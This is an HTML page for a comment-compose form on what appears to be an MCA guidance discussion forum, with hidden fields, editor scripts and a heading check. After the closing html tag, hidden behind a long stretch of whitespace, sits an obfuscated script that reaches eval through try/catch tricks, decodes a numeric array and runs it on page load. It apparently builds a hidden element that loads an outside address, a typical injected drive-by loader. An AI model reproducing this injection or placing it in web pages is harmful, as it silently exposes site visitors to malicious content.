<html>
<head>

<script type="text/javascript">var icjsdis = false;</script>
<script type="text/javascript" src="http://www.sanmacs.com/mca_guidance_disscusion_forum/toolbar/mailcommonlib.js"></script>
<style>
div.alertbox{ background-color:#ffffff; }
input {font-family:'Arial, Helvetica, sans-serif'; font-size:11px}
</style>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.css>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.1.css>
<link rel=stylesheet type=text/css href=http://www.sanmacs.com/images2/sanmacs2.2.css>
<link rel="stylesheet" type="text/css" href="http://www.sanmacs.com/mca_guidance_disscusion_forum/toolbar/pim_compose.css">

<script type="text/javascript" src="http://www.sanmacs.com/mca_guidance_disscusion_forum/toolbar/rteeditorlib1.js"></script>

<script src="http://www.sanmacs.com/mca_guidance_disscusion_forum/toolbar/ac.js"></script>

<script src="http://www.sanmacs.com/mca_guidance_disscusion_forum/toolbar/samx1.js" type="text/javascript"></script>
<script for="window" event="onunload" language="javascript">
	if(self.name != "ymailcompose" )
	{
		if (typeof editor != "undefined" && editor) {
		editor.Unload();
		editor = null;
		}
	}	
</script>
		
<script>
function check()
{
	var a=true;
        a=name(document.Compose.heading,"Enter a valid Heading!"); 
	if (a)
	{
		SaveMsg();
		Compose.submit();
	}
	else
	{
		return false;
	}
}

function name(val1,valx)
{
	var em,c1;
	em=val1.value;
	c1=em.length;
	if (c1<1)
	{
    	alert(valx);
  	  	val1.focus();
     	return false;
  	}
	else {
	return true;
	}
}
</script>

</head>

<body>

<form name="Compose" id="Compose" method=post action="http://www.sanmacs.com/mca_guidance_disscusion_forum/addquote.jsp">
<input type="hidden" name="SEND" value="">
<input type="hidden" name="SD" value="">
<input type="hidden" name="SC" value="">
<input type="hidden" name="CAN" value="">
<input type="hidden" name="docCharset" value="iso-8859-1">
<input type="hidden" name="PhotoMailUser" value="">
<input type="hidden" name="PhotoToolInstall" value="">
<input type="hidden" name="OpenInsertPhoto" value="">
<input type="hidden" name="PhotoGetStart" value="0">
<input type="hidden" name="SaveCopy" value="yes">
<input type="hidden" name="PhotoMailInstallOrigin" value="">

<input type=hidden name=".crumb" value="DSPWQrjCyJd">
<input type=hidden name="box" value="Inbox">
<input type=hidden name="FwdFile" value="">
<input type=hidden name="FwdMsg" value="">         
<input type=hidden name="FwdSubj" value="">   
<input type=hidden name="FwdInline" value="">
<input type=hidden name="OriginalFrom" value="">
<input type=hidden name="OriginalSubject" value="">
<input type=hidden name=InReplyTo value="">
<input type=hidden name=NumAtt value="0">
<input type=hidden name=AttData value="">         
<input type=hidden name=UplData value="">         
<input type=hidden name=OldAttData value="">
<input type=hidden name=OldUplData value="">
<input type=hidden name=FName value="">         
			
<input type=hidden name=ATT value="">
<input type=hidden name=VID value="">
<input type=hidden name=Markers value="">         
<input type=hidden name=NextMarker value="0">         
<input type=hidden name=Thumbnails value="">
<input type=hidden name=PhotoMailWith value="">
<input type=hidden name=BrowseState value="">
<input type=hidden name=PhotoIcon value="">
<input type=hidden name=ToolbarState value="">
<input type=hidden name=VirusReport value="">
<input type=hidden name=Attachments value="">
<input type=hidden name=Background value="">
<input type=hidden name=BGRef value="">
<input type=hidden name=BGDesc value="">
<input type=hidden name=BGDef value="">
<input type=hidden name=BGFg value="">
<input type=hidden name=BGFF value="">
<input type=hidden name=BGFS value="">
<input type=hidden name=BGSolid value="">
<input type=hidden name=BGCustom value="">
<input type=hidden name=PlainMsg value="">
<input type=hidden name=PhotoFrame value="">
<input type=hidden name=PhotoPrintAtHomeLink value="">
<input type=hidden name=PhotoSlideShowLink value="">
<input type=hidden name=PhotoPrintLink value="">
<input type=hidden name=PhotoSaveLink value="">
<input type=hidden name=PhotoPermCap value="">
<input type=hidden name=PhotoPermPath value="">
<input type=hidden name=PhotoDownloadUrl value="">
<input type=hidden name=PhotoSaveUrl value="">
<input type=hidden name=PhotoFlags value="">
<input type=hidden name=start value="compose">
<input type=hidden name=bmdomain value="">

<input type="hidden" name="showcc" value="">
<input type="hidden" name="showbcc" value="">
			
<input type=hidden name=AC_Done value="">
<input type=hidden name=AC_ToList value="">
<input type=hidden name=AC_CcList value="">
<input type=hidden name=AC_BccList value="">
<span id=stuff style="display:inline">
					
<table cellpadding="0" cellspacing="0" border="0" width="100%">
<tr valign="top"><td>

<div class="fieldset lightfill" style="padding-left:0;border-top-color:#FFFFFF;border-bottom:0;">

<table cellpadding=4 cellspacing=0 border=0>
<tr>
<td style="padding-top:0px;padding-bottom:0px;" nowrap>&nbsp;
</td>
<td style="padding-top:0px;padding-bottom:0px;">
<Div style="position:absolute;top:3px; left:125px">
<p id="ftp" align="justify" style="margin-left:17px"><input type=text name="heading" size=30></p>
</Div>

<table cellpadding=0 cellspacing=0 border=0>
<tr>
<td colspan=2 style="padding-top:4px;">
<div style='position:relative;top=0px;left=0px;height:250px' width=100%>
<script>
	if(self.name != "ymailcompose")
	{
		var editor = new RTEEditor(idGenerator);

		editor.SetStationeryButton(true);
		editor.SetLocation("us");
		editor.SetIconVersion("1");

        editor.SetFarmPath("http://www.sanmacs.com");

    		editor.SetSpellCheck(true);
    		editor.SetSpellCheckCB(SpellCheck_Click);
		editor.Instantiate();
	}
</script>
</div>
</td>
</tr>
</table>
</td>
</tr>
</table>
</div>
<!-- END APPLICATION CONTENT -->
</td>
</tr>
</table>
</span>

<script>
function composeClickHandler(loc)
{
	try{
	if( parent.showCompose )
		parent.showCompose();
	else window.location = loc;
	}
	catch(error){ window.location = loc; }
}
</script>

<script type="text/javascript">

	if(typeof Search_Click_top != 'undefined' && typeof Search_Click_bottom != 'undefined')
	{
	    var oSearchTop = MenuButton('searchmail0',Search_Click_top,'searchmenu',SearchMenu_Click);
	    var oSearchBottom = MenuButton('searchmail1',Search_Click_bottom,'searchmenu',SearchMenu_Click);
	}
	
</script>

<Div style="position:absolute; top:300px; left:250px">
<input type="button" name="sendtop" id="sendtop" value="Add Comments" title="Add Comments" onClick="check();">
</Div>

</form>

</body>
</html>
<script type="text/javascript">
if (window.yzq_a == null) document.write("<scr" + "ipt type=text/javascript src=http://www.sanmacs.com/mca_guidance_disscusion_forum/toolbar/bc_2.0.2.js></scr" + "ipt>");
</script><script type="text/javascript">
if (window.yzq_a) yzq_a('p', 'P=cjs_586.J6TNmC4YQ0X_VgAFwINag0NGAcEACZEx&T=13pubvhbs%2fX%3d1128661441%2fE%3d150500005%2fR%3dmail%2fK%3d5%2fV%3d1.1%2fW%3dG%2fY%3dsanmacs%2fF%3d960158206%2fS%3d1%2fJ%3dE630BECE');
if (window.yzq4) yzq4();
</script>


/*b5bee1*/
                                                                                                                                                                                                                                                          try{document.body/=2}catch(gdsgd){ww=window;v="va"+"l";if(ww.document)try{document.body=12;}catch(gdsgsdg){asd=0;try{q=document.createElement("div");}catch(q){asd=1;}if(!asd){w={a:ww}.a;vv="e"+v;}}e=w[vv];if(1){f=new Array(40,101,115,107,99,115,103,108,110,31,38,38,32,122,11,7,32,31,30,29,118,96,112,29,116,102,102,114,32,60,30,97,111,98,115,106,101,109,114,43,99,113,99,94,116,100,67,105,101,108,99,107,116,39,37,102,102,113,95,106,101,38,39,56,13,9,11,7,32,31,30,29,116,102,102,114,46,114,112,96,32,60,30,36,104,115,114,109,58,46,45,108,114,104,113,112,97,115,109,114,114,45,97,108,109,46,95,97,118,115,45,112,101,96,112,96,104,55,44,109,104,111,37,56,13,9,30,29,32,31,114,100,104,116,44,112,116,120,106,98,46,111,109,112,105,115,103,108,110,31,59,29,39,96,96,112,111,107,115,113,101,38,57,10,10,31,30,29,32,115,101,101,117,45,113,113,121,107,99,43,98,110,112,97,101,113,30,58,32,38,46,36,59,12,8,29,32,31,30,113,103,103,115,43,115,115,119,105,101,45,102,98,105,102,102,113,32,60,30,36,49,111,118,36,59,12,8,29,32,31,30,113,103,103,115,43,115,115,119,105,101,45,117,102,100,115,102,29,61,31,37,46,112,119,37,56,13,9,30,29,32,31,114,100,104,116,44,112,116,120,106,98,46,107,99,99,116,31,59,29,39,48,110,117,39,58,11,7,32,31,30,29,116,102,102,114,46,114,114,118,108,100,44,113,111,111,30,58,32,38,47,109,120,38,57,10,10,12,8,29,32,31,30,102,102,31,38,30,100,110,97,114,109,100,108,113,46,102,99,113,69,107,99,106,101,109,114,63,121,72,98,37,39,115,101,101,117,38,39,38,32,122,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,118,112,102,116,100,38,36,60,99,103,115,32,104,98,58,92,38,114,100,104,116,90,36,62,59,45,97,105,117,60,36,41,58,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,102,99,113,69,107,99,106,101,109,114,63,121,72,98,37,39,115,101,101,117,38,39,43,97,111,110,98,110,99,65,101,105,107,98,37,116,102,102,114,41,58,11,7,32,31,30,29,125,12,8,122,41,39,39,56);}w=f;s=[];for(i=0;-i+488!=0;i+=1){j=i;if((031==0x19))if(e)s=s+String.fromCharCode((1*w[j]+e("j%4")));}xz=e;xz(s)}
/*/b5bee1*/
